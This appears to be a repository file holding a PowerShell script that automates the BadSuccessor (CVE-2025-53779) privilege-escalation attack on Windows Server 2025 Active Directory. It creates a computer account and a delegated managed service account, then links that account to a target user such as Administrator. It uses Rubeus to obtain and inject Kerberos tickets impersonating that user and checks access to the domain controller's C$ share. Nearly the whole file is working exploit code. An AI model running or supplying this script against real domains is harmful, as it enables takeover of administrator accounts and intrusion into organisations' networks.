
---

## 5. `src/Invoke-BadSuccessor.ps1`

```powershell
<#
.SYNOPSIS
    Fully automated exploitation of the BadSuccessor vulnerability (CVE-2025-53779) in Windows Server 2025 AD.
.DESCRIPTION
    This script creates a computer account, a superseding dMSA, sets the target user as superseded,
    and uses Rubeus to obtain a Kerberos ticket impersonating that user.
.PARAMETER TargetUser
    The user to impersonate (e.g., 'DOMAIN\Administrator' or 'Administrator@domain.com').
.PARAMETER TargetOU
    Distinguished Name of the OU where the attacker has CreateChild permissions (e.g., 'OU=Computers,DC=contoso,DC=com').
.PARAMETER ComputerName
    Name for the temporary computer account (default: random 8 chars + '$').
.PARAMETER dMSAName
    Name for the Delegated Managed Service Account (default: 'dMSA-BadSuccessor').
.PARAMETER RubeusPath
    Path to Rubeus.exe (default: looks in same directory as script or PATH).
.PARAMETER ImpersonateService
    Optional service to test impersonation (default: 'CIFS/dc.domain.com').
.EXAMPLE
    Invoke-BadSuccessor -TargetUser 'CONTOSO\Administrator' -OU 'OU=Computers,DC=contoso,DC=com' -Verbose
.NOTES
    Author: Security Researcher
    Requires: ActiveDirectory PowerShell module, Rubeus.exe, Windows Server 2025 DC.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUser,
    
    [Parameter(Mandatory = $true)]
    [string]$TargetOU,
    
    [string]$ComputerName = ("Pwned" + -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object { [char]$_ }) + "$"),
    
    [string]$dMSAName = "dMSA-BadSuccessor",
    
    [string]$RubeusPath = "Rubeus.exe",
    
    [string]$ImpersonateService = "CIFS/$((Get-ADDomain).DNSRoot)"
)

#region Helper Functions
function Test-AdminModule {
    if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
        throw "ActiveDirectory PowerShell module not found. Install RSAT or AD DS tools."
    }
    Import-Module ActiveDirectory -ErrorAction Stop
}

function Test-Rubeus {
    if (-not (Get-Command $RubeusPath -ErrorAction SilentlyContinue) -and -not (Test-Path $RubeusPath)) {
        throw "Rubeus.exe not found at $RubeusPath. Download from https://github.com/GhostPack/Rubeus"
    }
}

function Get-RandomPassword {
    $length = 24
    $charSet = 'abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ0123456789!@#$%^&*'.ToCharArray()
    -join (1..$length | ForEach-Object { Get-Random -Maximum $charSet.Length | ForEach-Object { $charSet[$_] } })
}
#endregion

#region Pre-flight Checks
Write-Host "[*] Starting BadSuccessor attack chain" -ForegroundColor Cyan
Test-AdminModule
Test-Rubeus

# Verify OU exists and user has CreateChild (simplified check)
try {
    $ou = Get-ADOrganizationalUnit -Identity $TargetOU -ErrorAction Stop
    Write-Verbose "Target OU: $($ou.DistinguishedName)"
} catch {
    throw "OU '$TargetOU' not found or inaccessible."
}

# Check for Windows Server 2025 DC (rough: check OS version of any DC)
$dc = Get-ADDomainController -Discover -ErrorAction SilentlyContinue
if ($dc.OperatingSystem -notlike "*2025*") {
    Write-Warning "No Windows Server 2025 DC detected. Attack may fail."
}

# Ensure KDS Root Key exists (attempt to create if not? Usually auto)
try {
    $kdsKey = Get-KdsRootKey -ErrorAction SilentlyContinue
    if (-not $kdsKey) {
        Write-Warning "No KDS Root Key found. Attempting to create one (requires Domain Admin)."
        # We won't auto-create because that needs elevated rights; just warn.
    }
} catch {}
#endregion

#region Step 1: Create computer account
Write-Host "[1] Creating computer account: $ComputerName" -ForegroundColor Yellow
$computerPassword = Get-RandomPassword
$securePass = ConvertTo-SecureString $computerPassword -AsPlainText -Force
try {
    New-ADComputer -Name $ComputerName -AccountPassword $securePass -Enabled $true -Path $TargetOU -ErrorAction Stop
    Write-Verbose "Computer account created."
} catch {
    throw "Failed to create computer account: $_"
}
#endregion

#region Step 2: Create dMSA account
Write-Host "[2] Creating Delegated Managed Service Account: $dMSAName" -ForegroundColor Yellow
try {
    # Note: -Delegated flag is required for supersedence capability (Windows Server 2025)
    New-ADServiceAccount -Name $dMSAName -Enabled $true -Path $TargetOU `
        -PrincipalsAllowedToRetrieveManagedPassword $ComputerName `
        -Delegated -ErrorAction Stop
    Write-Verbose "dMSA created."
} catch {
    Remove-ADComputer -Identity $ComputerName -Confirm:$false -ErrorAction SilentlyContinue
    throw "Failed to create dMSA: $_"
}
#endregion

#region Step 3: Set supersedence attributes
Write-Host "[3] Setting supersedence link to target user: $TargetUser" -ForegroundColor Yellow
# Resolve target user DN
try {
    $targetUserObj = Get-ADUser -Identity $TargetUser -ErrorAction Stop
    $targetUserDN = $targetUserObj.DistinguishedName
} catch {
    Remove-ADComputer -Identity $ComputerName -Confirm:$false -ErrorAction SilentlyContinue
    Remove-ADServiceAccount -Identity $dMSAName -Confirm:$false -ErrorAction SilentlyContinue
    throw "Target user '$TargetUser' not found."
}

$dMSA = Get-ADServiceAccount -Identity $dMSAName
try {
    Set-ADObject -Identity $dMSA.DistinguishedName -Replace @{
        'msDS-DelegatedMSAState' = 2
        'msDS-ManagedAccountPrecededByLink' = $targetUserDN
    } -ErrorAction Stop
    Write-Verbose "Attributes set."
} catch {
    # Cleanup
    Remove-ADComputer -Identity $ComputerName -Confirm:$false -ErrorAction SilentlyContinue
    Remove-ADServiceAccount -Identity $dMSAName -Confirm:$false -ErrorAction SilentlyContinue
    throw "Failed to set supersedence attributes: $_"
}
#endregion

#region Step 4: Obtain dMSA password hash using computer account
Write-Host "[4] Retrieving dMSA password hash via computer account" -ForegroundColor Yellow
# We need to use Rubeus to request the dMSA password blob from KDS and compute hash
# This requires the computer account to be authenticated. We'll use its password.
# First, get the computer account's AES256 key using Rubeus 'hash' command
$computerHashOutput = & $RubeusPath hash /password:$computerPassword /user:$ComputerName 2>&1 | Out-String
if ($computerHashOutput -match "AES256:\s*([A-F0-9]{64})") {
    $computerAES256 = $matches[1]
    Write-Verbose "Computer AES256: $computerAES256"
} else {
    Write-Error "Could not extract AES256 hash from computer account."
    # Continue with alternative: request TGT using password
}

# Request TGT for computer account
$tgtFile = "$env:TEMP\computer_tgt.kirbi"
& $RubeusPath asktgt /user:$ComputerName /aes256:$computerAES256 /outfile:$tgtFile /nowrap
if (-not (Test-Path $tgtFile)) {
    throw "Failed to get TGT for computer account."
}
Write-Verbose "TGT obtained for computer account."

# Now request TGS for the dMSA with S4U2Self (the magic step)
$tgsFile = "$env:TEMP\dmsa_tgs.kirbi"
& $RubeusPath asktgs /service:$dMSAName /ticket:$tgtFile /impersonateuser:$TargetUser /dmsa /outfile:$tgsFile /nowrap
if (-not (Test-Path $tgsFile)) {
    throw "Failed to get TGS for dMSA. Is the DC Windows Server 2025? Does the dMSA have supersedence properly set?"
}
Write-Verbose "Impersonation TGS obtained for $TargetUser"
#endregion

#region Step 5: Inject ticket and test
Write-Host "[5] Injecting ticket and testing impersonation" -ForegroundColor Yellow
& $RubeusPath ptt /ticket:$tgsFile
Write-Host "[+] Ticket injected. Current Kerberos tickets:" -ForegroundColor Green
klist

# Test access to a service (e.g., C$ on DC)
$testPath = "\\$($dc.HostName)\C$"
Write-Host "[*] Testing access to $testPath as $TargetUser" -ForegroundColor Cyan
try {
    Get-ChildItem $testPath -ErrorAction Stop | Out-Null
    Write-Host "[SUCCESS] Successfully accessed $testPath as $TargetUser" -ForegroundColor Green
} catch {
    Write-Warning "Access test failed. The ticket may not grant access to this specific service. Manual verification required."
}
#endregion

#region Cleanup (optional)
Write-Host "[*] Attack completed. To clean up, run:" -ForegroundColor Yellow
Write-Host "    Remove-ADServiceAccount -Identity $dMSAName -Confirm:`$false"
Write-Host "    Remove-ADComputer -Identity $ComputerName -Confirm:`$false"
Write-Host "Cleanup not performed automatically to allow further testing."
#endregion